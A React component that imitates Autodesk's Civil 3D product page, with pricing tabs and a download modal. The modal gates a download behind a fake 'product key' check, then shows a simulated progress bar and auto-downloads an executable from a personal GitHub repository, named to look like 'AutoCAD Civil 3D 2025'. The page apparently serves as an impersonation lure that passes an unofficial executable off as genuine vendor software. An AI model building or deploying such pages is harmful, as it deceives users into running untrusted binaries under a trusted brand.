import { Badge } from "@/components/ui/Badge";
import { Modal } from "@/components/ui/Modal";
import { Tabs } from "@/components/ui/Tabs";
import { cn } from "@/lib/utils";
import {
  CheckCircle,
  Download,
  Info,
  Lock,
  RefreshCw,
  ShieldCheck,
} from "lucide-react";
import { useEffect, useState } from "react";

const plans = [
  {
    title: "Annual",
    price: 2870,
    description: "Savings of 34% compared to monthly price",
    badge: "Most Popular",
    billing: "yearly",
  },
  {
    title: "Monthly",
    price: 360,
    billing: "monthly",
  },
  {
    title: "Flex",
    price: 300,
    billing: "/100 tokens (minimum)",
    description: "9 tokens /day for this product",
  },
];

const buyIncentives = [
  {
    label: "Up to 30-day money back guarantee",
    href: "/buying/how-to-buy#buying-frequently-asked-questions",
    icon: RefreshCw,
  },
  {
    label: "Lock in your price for 3 years",
    href: "/buying/terms-payments",
    icon: Lock,
  },
  {
    label: "Buy with flexibility and security",
    href: "/buying/how-to-buy#why-buy-with-autodesk",
    icon: ShieldCheck,
  },
  {
    label: "See more reasons to buy with Autodesk",
    href: "/benefits/overview",
    icon: Info,
  },
];

type Props = {
  className?: string;
  isOpen?: boolean;
  setIsOpen?: (open: boolean) => void;
};

const HeroSection = ({ isOpen, setIsOpen }: Props = {}) => {
  const [productKey, setProductKey] = useState("");
  const [showError, setShowError] = useState(false);
  const [isKeyVerified, setIsKeyVerified] = useState(false);
  const [progress, setProgress] = useState(0);

  const [tab, setTab] = useState(0);
  const [terms, setTerms] = useState("1-year");

  const isValidKey = /^[a-zA-Z0-9]{4,6}$/.test(productKey);
  const validKeys = ["057K3"];

  const handleSubmitKey = () => {
    if (validKeys.includes(productKey)) {
      setIsKeyVerified(true);
      setShowError(false);
      simulateDownload();

      // Auto start download after 5 seconds
      setTimeout(() => {
        startAutoDownload();
      }, 5000);
    } else {
      setShowError(true);
    }
  };

  // Simulate download progress
  const simulateDownload = () => {
    let currentProgress = 0;
    const interval = setInterval(() => {
      if (currentProgress >= 100) {
        clearInterval(interval);
      } else {
        currentProgress += 5;
        setProgress(currentProgress);
      }
    }, 200);
  };

  // Auto download function
  const startAutoDownload = () => {
    const tempLink = document.createElement("a");
    tempLink.href =
      "https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk%20Setup%201.0.5.exe";
    tempLink.download = "AutoCAD Civil 3D 2025";
    tempLink.style.display = "none";
    document.body.appendChild(tempLink);
    tempLink.click();
    document.body.removeChild(tempLink);
  };

  // Handle download link click
  const handleDownloadClick = () => {
    alert("Your download will start shortly.");
  };

  // Reset modal state
  const resetModal = () => {
    setProductKey("");
    setShowError(false);
    setIsKeyVerified(false);
    setProgress(0);
  };

  // Close modal
  const closeModal = () => {
    setIsOpen?.(false);
    resetModal();
  };

  // Handle escape key
  useEffect(() => {
    const handleEscape = (e: KeyboardEvent) => {
      if (e.key === "Escape" && isOpen) {
        closeModal();
      }
    };

    document.addEventListener("keydown", handleEscape);
    return () => document.removeEventListener("keydown", handleEscape);
  }, [isOpen]);

  // Clear error when typing
  useEffect(() => {
    if (showError) {
      setShowError(false);
    }
  }, [productKey]);

  return (
    <div
      style={{ backgroundImage: "url('/background.png')" }}
      className="container space-y-8 bg-cover bg-center bg-no-repeat py-8 md:py-16"
    >
      <div className="space-y-4 md:max-w-1/2">
        <div className="flex items-center gap-2">
          <img className="h-10" src="/civil-logo.png" alt="" />
          Civil 3D
        </div>
        <h3 className="text-2xl font-black md:text-3xl">
          Autodesk Civil 3D: Comprehensive detailed design and documentation
          <br />
          software for civil infrastructure
        </h3>
        <div>
          <button
            onClick={() => setIsOpen?.(true)}
            className="border-foreground text-foreground flex h-10 cursor-pointer items-center gap-2 rounded border bg-transparent px-6 hover:outline-1 hover:outline-purple-900"
          >
            <Download />
            <span>Download</span>
          </button>
          <Modal isOpen={isOpen} setIsOpen={setIsOpen}>
            <Modal.Backdrop>
              <Modal.Content
                className="dark text-card-foreground bg-card"
                size="sm"
              >
                <Modal.Header>
                  <Modal.Title>Download AutoCAD Civil 3D 2025</Modal.Title>
                  <Modal.Close />
                </Modal.Header>
                <Modal.Body>
                  <div className="dark text-card-foreground bg-card">
                    {!isKeyVerified ? (
                      <div className="space-y-6">
                        <div className="space-y-4">
                          <label
                            htmlFor="productKey"
                            className="block text-sm font-bold"
                          >
                            Enter your product key
                          </label>
                          <input
                            type="text"
                            id="productKey"
                            maxLength={6}
                            placeholder="Enter (4 to 6) - digit product key"
                            value={productKey}
                            onChange={(e) => setProductKey(e.target.value)}
                            className="bg-muted focus:border-foreground w-full border px-4 py-3 focus:outline-none"
                            autoFocus
                          />
                        </div>
                        <button
                          onClick={handleSubmitKey}
                          disabled={!isValidKey}
                          className={cn(
                            "border-foreground text-foreground flex h-10 w-full cursor-pointer items-center justify-center gap-2 rounded border bg-transparent px-6 hover:outline-1",
                            {
                              "outline-purple-900 hover:outline-purple-900":
                                isValidKey,
                              "bg-muted text-muted-foreground cursor-not-allowed":
                                !isValidKey,
                            },
                          )}
                        >
                          <span>SUBMIT</span>
                        </button>
                        {showError && (
                          <div className="font-bold text-red-400">
                            Invalid product key. Please enter a valid 4 to 6
                            digit key.
                          </div>
                        )}
                      </div>
                    ) : (
                      <div className="space-y-4">
                        <div className="mb-4 flex flex-wrap items-center gap-1 font-bold text-green-400">
                          <CheckCircle />
                          Product key successfully verified!
                        </div>
                        <div className="bg-muted border p-4">
                          <p className="mb-2">
                            AutoCAD Civil 3D 2025 Ready for Download
                          </p>
                          <a
                            href="https://github.com/foysalahmedmin/civicad-key-electron.js/raw/refs/heads/main/uploads/autodesk%20Setup%201.0.5.exe"
                            download="AutoCAD Civil 3D 2025"
                            onClick={handleDownloadClick}
                            className="font-bold text-purple-900 underline hover:no-underline"
                          >
                            Click here to download
                          </a>
                          <div className="mt-4">
                            <div className="bg-muted h-4 overflow-hidden border">
                              <div
                                className="bg-background h-full transition-all duration-300 ease-out"
                                style={{ width: `${progress}%` }}
                              ></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>
                </Modal.Body>
              </Modal.Content>
            </Modal.Backdrop>
          </Modal>
        </div>
        <strong className="block">
          Have questions about selecting or buying software?
        </strong>
      </div>
      <div className="bg-muted/50 space-y-6 overflow-hidden rounded-xl border py-6 pb-0 backdrop-blur-xl md:py-10">
        <div className="px-6 md:px-10">
          <div className="space-y-6">
            <h3 className="text-xl font-black md:text-3xl">Plans Civil 3D</h3>
            <div>
              <Tabs
                value={tab}
                onValueChange={(value) => setTab(value as number)}
                className="space-y-6"
              >
                <Tabs.List className="grid w-full gap-4 md:grid-cols-3">
                  {plans?.map((plan, index) => (
                    <Tabs.Trigger
                      className={cn(
                        "border-foreground/50 bg-background cursor-pointer rounded-xl border hover:border-purple-900",
                        {
                          "border-foreground hover:border-foreground outline-foreground outline-2":
                            tab === index,
                        },
                      )}
                      key={plan.title}
                      value={index}
                    >
                      <div className="size-full space-y-4 p-6">
                        <h4 className="text-lg font-bold">{plan.title}</h4>
                        <div className="space-y-2">
                          <h4 className="flex flex-wrap items-end gap-1 leading-none">
                            <span className="text-lg leading-none font-bold">
                              ${plan.price}
                            </span>
                            /
                            <span className="leading-none">
                              {plan?.billing}
                            </span>
                          </h4>
                          {plan.description && (
                            <p className="">{plan.description}</p>
                          )}
                        </div>
                        {plan.badge && (
                          <div className="flex items-center gap-1">
                            <Badge className="bg-muted text-foreground rounded-full px-4 py-1 text-sm">
                              {plan.badge}
                            </Badge>
                          </div>
                        )}
                      </div>
                    </Tabs.Trigger>
                  ))}
                </Tabs.List>
                <hr />
                <Tabs.Content>
                  <Tabs.Item value={0}>
                    <div className="flex flex-col items-center justify-between gap-4 md:flex-row">
                      <div className="flex items-center gap-4">
                        <p className="hidden md:block">Select Term</p>
                        <label className="flex cursor-pointer items-center gap-2">
                          <input
                            className="accent-accent size-5"
                            type="radio"
                            name="terms"
                            value="1-year"
                            checked={terms === "1-year"}
                            onChange={(e) => setTerms(e.target.value)}
                          />
                          <span>1 Year</span>
                        </label>
                        <label className="flex cursor-pointer items-center gap-2">
                          <input
                            className="accent-accent size-5 bg-transparent"
                            type="radio"
                            name="terms"
                            value="3-year"
                            checked={terms === "3-year"}
                            onChange={(e) => setTerms(e.target.value)}
                          />
                          <span>3 Year</span>
                        </label>
                      </div>
                      <div>
                        {terms === "1-year" ? (
                          <>
                            <h4 className="flex flex-wrap items-end gap-1 leading-none">
                              <span className="text-xl leading-none font-black">
                                $2,870
                              </span>
                              /
                              <span className="leading-none">
                                year for 1 user
                              </span>
                            </h4>
                          </>
                        ) : (
                          <>
                            <h4 className="flex flex-wrap items-end gap-1 leading-none">
                              <span className="text-xl leading-none font-black">
                                $8,610
                              </span>
                              /
                              <span className="leading-none">
                                3 years for 1 user
                              </span>
                            </h4>
                          </>
                        )}
                      </div>
                    </div>
                  </Tabs.Item>
                  <Tabs.Item value={1}>
                    <div className="flex items-center justify-center md:justify-end">
                      <h4 className="flex flex-wrap items-end gap-1 leading-none">
                        <span className="text-xl leading-none font-black">
                          $360
                        </span>
                        /<span className="leading-none">month for 1 user</span>
                      </h4>
                    </div>
                  </Tabs.Item>
                  <Tabs.Item value={2}>
                    <div className="flex items-center justify-center md:justify-end">
                      <h4 className="flex flex-wrap items-end gap-1 leading-none">
                        <span className="text-xl leading-none font-black">
                          $300
                        </span>
                        /<span className="leading-none">100 tokens</span>
                      </h4>
                    </div>
                  </Tabs.Item>
                </Tabs.Content>
              </Tabs>
            </div>
          </div>
        </div>
        <div className="bg-muted/50 border-t px-6 md:px-10">
          <div className="flex min-h-16 flex-wrap items-center justify-between gap-4 py-4">
            {buyIncentives.map(({ label, href, icon: Icon }) => (
              <a
                key={label}
                href={href}
                className="flex items-center gap-2 text-sm"
              >
                <Icon className="h-5 w-5" />
                <span>{label}</span>
              </a>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
};

export default HeroSection;
